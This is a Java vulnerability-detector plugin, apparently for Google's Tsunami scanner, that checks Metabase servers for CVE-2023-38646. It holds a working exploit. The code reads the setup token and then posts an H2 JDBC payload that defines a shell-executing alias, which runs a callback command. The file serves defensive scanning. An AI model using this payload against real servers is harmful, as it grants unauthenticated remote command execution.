/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202338646;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Pre-Auth RCE in Metabase CVE-2023-38646. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Pre-Auth RCE in Metabase CVE-2023-38646 Detector",
    version = "0.1",
    description =
        "This detector checks Pre-Auth RCE in Metabase Open source before 0.46.6.1 and Metabase"
            + " Enterprise before 1.46.6.1",
    author = "secureness",
    bootstrapModule = Cve202338646DetectorBootstrapModule.class)
public final class Cve202338646Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  @VisibleForTesting static final String SETUP_TOKEN_ENDPOINT = "api/session/properties";
  @VisibleForTesting static final String DB_CREATE_ENDPOINT = "api/setup/validate";
  private static final String PAYLOAD =
      "{\"details\": {\"details\": {\"advanced-options\": true, \"classname\": \"org.h2.Driver\","
          + " \"subname\": \"mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void"
          + " shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new"
          + " String[]{\\\"sh\\\", \\\"-c\\\", cmd})\\\\;}$$\\\\;CALL SHELLEXEC('%s');\","
          + " \"subprotocol\": \"h2\"}, \"engine\": \"postgres\", \"name\": \"x\"}, \"token\":"
          + " \"%s\"}";

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202338646Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setTrustAllCertificates(true).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService);
  }

  private boolean isVulnerableWithCallback(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();
    String setupPayload = getSetupToken(networkService);
    if (setupPayload != null) {
      sendRequest(networkService, String.format(PAYLOAD, cmd, setupPayload));
    }
    return payload.checkIfExecuted();
  }

  private String getSetupToken(NetworkService networkService) {
    HttpHeaders httpHeaders = HttpHeaders.builder().build();
    String targetVulnerabilityUrl =
        buildTarget(networkService).append(SETUP_TOKEN_ENDPOINT).toString();
    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetVulnerabilityUrl).setHeaders(httpHeaders).build(), networkService);
      if (httpResponse.bodyJson().isEmpty()) {
        return null;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("setup-token")) {
        return jsonResponse.get("setup-token").getAsString();
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return null;
    }
    return null;
  }

  private void sendRequest(NetworkService networkService, String payload) {
    HttpHeaders httpHeaders =
        HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build();

    String targetVulnerabilityUrl =
        buildTarget(networkService).append(DB_CREATE_ENDPOINT).toString();
    try {
      httpClient.send(
          post(targetVulnerabilityUrl)
              .setHeaders(httpHeaders)
              .setRequestBody(ByteString.copyFromUtf8(payload))
              .build(),
          networkService);
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2023-38646"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Metabase Pre-Authentication RCE (CVE-2023-38646)")
                .setDescription(
                    "Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1"
                        + " has a vulnerability that allows attackers to execute arbitrary commands"
                        + " on the server, at the server's privilege level. Authentication is not"
                        + " required for exploitation")
                .setRecommendation(
                    "Please upgrade Metabase to patched versions: v0.46.6.4, v1.46.6.4, v0.45.4.3,"
                        + " v1.45.4.3, v0.44.7.3, v1.44.7.3, v0.43.7.3 or v1.43.7.3."))
        .build();
  }
}
